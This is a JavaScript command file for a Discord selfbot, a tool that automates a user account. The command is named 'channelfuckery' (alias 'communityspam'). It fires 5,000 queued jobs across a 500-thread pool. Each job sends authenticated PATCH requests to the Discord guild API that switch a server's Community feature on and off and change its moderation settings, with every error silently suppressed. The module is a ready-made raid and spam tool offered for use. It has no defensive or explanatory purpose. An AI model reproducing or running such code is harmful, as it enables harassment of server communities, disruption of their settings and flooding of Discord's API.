const { default: ThreadPool } = require("threadpool");

const { Message, Client } = require("djs-selfbot");
const { default: axios } = require("axios");

module.exports = {
  name: "channelfuckery",
  aliases: ["communityspam", "cf"],
  description: "Normal Channel Fuckery / Community Spam",
  /**
   *
   * @param {Client} client
   * @param {Message} message
   * @param {String[]} args
   */
  run: async (client, message, args) => {
    try {
      const { guild } = message;

      let i = new ThreadPool(500, { errorHandler: (e) => {} });
      for (let t = 0; t < 5000; t++)
        i.queue(async () => {
          try {
            const t = { verification_level: 1, default_message_notifications: 0, explicit_content_filter: 2, rules_channel_id: "1", public_updates_channel_id: "1" };
            try {
              await axios({ url: `https://discord.com/api/v${[8, 9].random()}/guilds/${guild.id}`, method: "PATCH", headers: { Authorization: client.token }, data: { features: [...guild.features, "COMMUNITY"], ...t } });
            } catch (e) {}
            try {
              await axios({ url: `https://discord.com/api/v${[8, 9].random()}/guilds/${guild.id}`, method: "PATCH", headers: { Authorization: client.token }, data: { features: [], ...t } });
            } catch (e) {}
          } catch (e) {}
        });
      i.run();
      try {
        await i.waitComplete();
      } catch (e) {}
    } catch (err) {
      client.logger(err);
    }
  },
};